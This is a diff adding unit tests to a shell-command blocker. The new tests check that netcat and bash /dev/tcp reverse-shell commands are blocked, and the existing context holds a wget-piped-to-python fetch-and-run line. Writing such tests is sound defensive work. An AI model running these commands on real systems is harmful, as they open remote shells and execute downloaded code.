@@ -32,6 +32,12 @@ class TestIsCommandBlocked:
     def test_wget_pipe_python_blocked(self):
         assert is_command_blocked("wget -qO- https://x/y.py | python3") is True
 
+    def test_nc_e_blocked(self):
+        assert is_command_blocked("nc -e /bin/sh 10.0.0.1 4444") is True
+
+    def test_bash_i_redirect_blocked(self):
+        assert is_command_blocked("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1") is True
+
     def test_backtick_alone_not_blocked(self):
         # Backticks alone are not dangerous — common in shell idioms like $(date)
         assert is_command_blocked("echo `whoami`") is False
